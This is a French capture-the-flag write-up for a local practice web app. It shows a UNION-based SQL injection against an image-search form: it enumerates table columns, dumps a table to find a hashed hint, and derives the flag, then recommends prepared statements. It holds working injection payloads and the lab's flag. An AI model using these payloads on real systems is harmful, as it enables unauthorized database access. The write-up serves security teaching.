# SQL injection basic

Depuis la page `search images` (`http://localhost:8080/index.php?page=searchimg`) on a acces a un formulaire qui permet d'afficher le `title` et le `url` d'une image a partir de son ID.

La page fait certainement une requete toute simple du type:

        SELECT title, url FROM images WHERE id = $id

Ou `$id` en PHP pourrait etre $_GET['id'], par exemple, et donc on peut exploiter une faille de type `Injection SQL`.

En essayant diffrents ID, on trouve pour l'ID 5 la sortie suivante:

        ID: 5
        Title: Hack me ?
        Url : borntosec.ddns.net/images.png

On essaye donc d'injecter une requete pour recuperer la liste des tables:

        1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS

Et on obtient la sortie suivante:

        [...]

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        Title: id
        Url : list_images

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        Title: url
        Url : list_images

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        Title: title
        Url : list_images

        ID: 1 OR 1 = 1 UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS
        Title: comment
        Url : list_images

        [...]

On en deduit qu'une table `list_images` existe avec les champs `id`, `url`, `title`, `comment`.

Les champs `title` et `comment` doivent probablement conternir le flag pour le membre d'ID 5.

On essaye d'injecter la requete suivante:

        1 OR 1 = 1 UNION SELECT title, comment FROM list_images WHERE id = 5

Et on obtient la sortie suivante, qui contient le flag et l'instruction pour le dechiffrer:

        ID: 1 OR 1 = 1 UNION SELECT title, comment FROM list_images WHERE id = 5
        Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
        Url : Hack me ?

On le dechiffre via le site `https://www.dcode.fr/md5-hash` et on obtient: `albatroz`

On le met en lettres minuscules et on applique dessus l'algo `Sh256` via le site `https://www.sha256.fr/` pour obtenir le flag:

        f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

## Eviter cette faille

Pour eviter ce genre de faille, il suffirait de ne pas injecter directement l'ID dans la requete, d'utiliser des requetes preparees ou d'utilisers des ORM (object-relational mapping).
